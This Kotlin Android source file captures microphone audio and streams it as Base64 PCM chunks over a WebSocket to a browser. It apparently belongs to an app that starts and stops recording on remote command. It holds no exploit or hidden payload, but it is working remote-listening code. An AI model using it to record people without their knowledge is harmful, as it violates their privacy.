package com.kashem.shaikh.streaming

import android.annotation.SuppressLint
import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Base64
import com.kashem.shaikh.services.AppLogs
import com.kashem.shaikh.services.WebSocketClient
import org.json.JSONObject

/**
 * Mic → PCM 16-bit mono 16kHz → WebSocket → Browser (Web Audio API)
 */
object AudioStreamer {

    private const val SAMPLE_RATE = 16000
    private const val CHANNEL = AudioFormat.CHANNEL_IN_MONO
    private const val ENCODING = AudioFormat.ENCODING_PCM_16BIT
    private const val CHUNK_MS = 100
    private const val CHUNK_SAMPLES = SAMPLE_RATE * CHUNK_MS / 1000
    private const val MAX_CONSECUTIVE_ERRORS = 50

    @Volatile private var running = false
    @Volatile private var thread: Thread? = null
    @Volatile private var record: AudioRecord? = null

    @Synchronized
    fun start(context: Context): String {
        if (running) return "SUCCESS: Audio already streaming"

        val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING)
        if (minBuf <= 0) return "ERROR: AudioRecord not supported"
        // bufSize: minBuffer বা chunk এর 4x (headroom) — যেটা বেশি
        val bufSize = maxOf(minBuf, CHUNK_SAMPLES * 2 * 4)

        return try {
            @SuppressLint("MissingPermission")
            val rec = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE, CHANNEL, ENCODING, bufSize
            )
            if (rec.state != AudioRecord.STATE_INITIALIZED) {
                rec.release()
                return "ERROR: AudioRecord init failed"
            }

            rec.startRecording()
            record = rec
            running = true

            // ✅ FIX: reader thread শুধু পড়ে; stop()/release() stop() method-এ
            thread = Thread {
                try {
                    AppLogs.info("AudioStreamer: started (${SAMPLE_RATE}Hz, chunk=${CHUNK_MS}ms)")
                    val buf = ShortArray(CHUNK_SAMPLES)
                    var frameNo = 0L
                    var consecutiveErrors = 0

                    while (running) {
                        val n = try { rec.read(buf, 0, buf.size) }
                                catch (_: Exception) { -1 }

                        // ✅ FIX: busy-loop prevention
                        if (n <= 0) {
                            consecutiveErrors++
                            if (consecutiveErrors > MAX_CONSECUTIVE_ERRORS) {
                                AppLogs.error(
                                    "AudioStreamer: $MAX_CONSECUTIVE_ERRORS consecutive read errors, stopping"
                                )
                                running = false
                                break
                            }
                            try { Thread.sleep(20) } catch (_: InterruptedException) { break }
                            continue
                        }
                        consecutiveErrors = 0

                        // ShortArray → ByteArray (little-endian)
                        val bytes = ByteArray(n * 2)
                        for (i in 0 until n) {
                            val v = buf[i].toInt()
                            bytes[i * 2] = (v and 0xFF).toByte()
                            bytes[i * 2 + 1] = ((v shr 8) and 0xFF).toByte()
                        }

                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        try {
                            WebSocketClient.sendRaw(JSONObject().apply {
                                put("type", "audio_frame")
                                put("sr", SAMPLE_RATE)
                                put("data", b64)
                            }.toString())
                        } catch (_: Exception) {}

                        frameNo++
                        if (frameNo % 50 == 0L) {
                            AppLogs.debug("AudioStreamer: $frameNo chunks sent")
                        }
                    }
                } catch (e: Exception) {
                    AppLogs.error("AudioStreamer: read thread failed", e)
                } finally {
                    AppLogs.info("AudioStreamer: read thread exited")
                    // ✅ FIX: release এখানে নয় — stop() handle করবে
                }
            }.also { it.start() }

            try {
                WebSocketClient.sendRaw(JSONObject().apply {
                    put("type", "audio_info")
                    put("sr", SAMPLE_RATE)
                    put("state", "start")
                }.toString())
            } catch (_: Exception) {}

            "SUCCESS: Audio streaming started (${SAMPLE_RATE}Hz)"
        } catch (e: SecurityException) {
            "ERROR: RECORD_AUDIO permission not granted"
        } catch (e: Exception) {
            AppLogs.error("AudioStreamer start failed", e)
            "ERROR: ${e.message}"
        }
    }

    @Synchronized
    fun stop(): String {
        if (!running) return "SUCCESS: Audio not streaming"
        running = false

        val rec = record
        val th = thread

        // 1. Unblock blocking read
        try { rec?.stop() } catch (_: Exception) {}

        // 2. Wait for reader thread to finish
        try { th?.join(3000) } catch (_: InterruptedException) {}

        // 3. Release — exactly once
        try { rec?.release() } catch (_: Exception) {}

        record = null
        thread = null

        try {
            WebSocketClient.sendRaw(JSONObject().apply {
                put("type", "audio_info")
                put("state", "stop")
            }.toString())
        } catch (_: Exception) {}

        AppLogs.info("AudioStreamer: stopped")
        return "SUCCESS: Audio stopped"
    }

    fun isRunning(): Boolean = running
}